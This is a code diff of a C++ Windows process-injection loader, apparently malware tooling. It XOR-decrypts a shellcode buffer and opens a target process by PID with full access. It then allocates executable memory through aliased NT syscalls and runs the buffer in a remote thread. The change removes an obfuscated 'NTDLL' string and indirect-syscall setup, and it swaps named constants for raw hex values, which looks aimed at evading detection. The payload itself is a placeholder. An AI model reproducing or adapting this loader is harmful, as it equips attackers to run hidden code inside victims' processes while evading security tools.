@@ -1,6 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
-#include "wonka.h"
+#include "wanka.h"
 
 //bring in and define external variables
 extern "C" {
@@ -19,17 +19,15 @@ extern "C" {
 }
 
 //define XOR encrypted shellcode
-unsigned char shellcode[] = "XOR ENCRYPTED PAYLOAD HERE";
-
-//define XOR encrypted string "NTDLL"
-char NDLCRY[] = "\x14\x35\x37\x28\x3b";
+unsigned char shellcode[] =
+"SHELLCODE";
 
 int main(int argc, char* argv[]) {
 
     //decrypt shellcode
-    char key[] = "YOUR XOR KEY";
+    char key[] = "SHELLCODE KEY";
     int ciphertext_length = sizeof(shellcode);
-    //delete following line if you do not XOR encrypt your shellcode
+    //you can just delete the following line if you do not XOR encrypt your shellcode
     xor_decrypt(shellcode, ciphertext_length, key);
 
     //define necessary variables for use
@@ -40,7 +38,6 @@ int main(int argc, char* argv[]) {
     HANDLE nT = NULL;
     DWORD PID = NULL;
     PVOID bA = NULL;
-    HMODULE hNTDLL;
     NTSTATUS STATUS = NULL;
 
     //check if PID was passed as argument, if not exit
@@ -53,28 +50,14 @@ int main(int argc, char* argv[]) {
     OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
     CLIENT_ID CID = { (HANDLE)(uintptr_t)PID, NULL };
 
-    //decrypt ntdll string and convert to LPCWSTR
-    DecryptXOR(NDLCRY, strlen(NDLCRY), key, strlen(key));
-    LPCWSTR NDLNOCRY = ConvertToLPCWSTR(NDLCRY);
-
-    //get handle to ntdll
-    hNTDLL = GetModuleHandleW(NDLNOCRY);
-
-    //get stub location of timer related syscalls
-    IndirectPrelude(hNTDLL, "NtCreateTimer", &NtCreateTimerSyscall);
-    IndirectPrelude(hNTDLL, "NtOpenTimer", &NtOpenTimerSyscall);
-    IndirectPrelude(hNTDLL, "NtSetTimer", &NtSetTimerSyscall);
-    IndirectPrelude(hNTDLL, "NtQueryTimer", &NtQueryTimerSyscall);
-    IndirectPrelude(hNTDLL, "NtCancelTimer", &NtCancelTimerSyscall);
-
     //open process with the passed PID
-    STATUS = OP(&pH, PROCESS_ALL_ACCESS, &OA, &CID);
+    STATUS = OP(&pH, ((0x000F0000L) | (0x00100000L) | 0xFFFF), &OA, &CID);
     if (!STATUS == STATUS_SUCCESS) {
         return EXIT_FAILURE;
     }
-
+    
     //allocate memory inside of the process
-    STATUS = AVM(pH, &bA, 0, &rS, MEM_COMMIT | MEM_RESERVE, 0x40);
+    STATUS = AVM(pH, &bA, 0, &rS, 0x00001000 | 0x00002000, 0x40);
     if (!STATUS == STATUS_SUCCESS) {
         return EXIT_FAILURE;
     }
@@ -91,7 +74,7 @@ int main(int argc, char* argv[]) {
         return EXIT_FAILURE;
     }
 
-    //wait for thread to be fully executed conclude
+    //wait for thread to be fully executed
     STATUS = WFSO(nT, FALSE, NULL);
     if (!STATUS == STATUS_SUCCESS) {
         return EXIT_FAILURE;
@@ -104,4 +87,4 @@ int main(int argc, char* argv[]) {
     if (pH) {
         C(pH);
     }
- }
+}
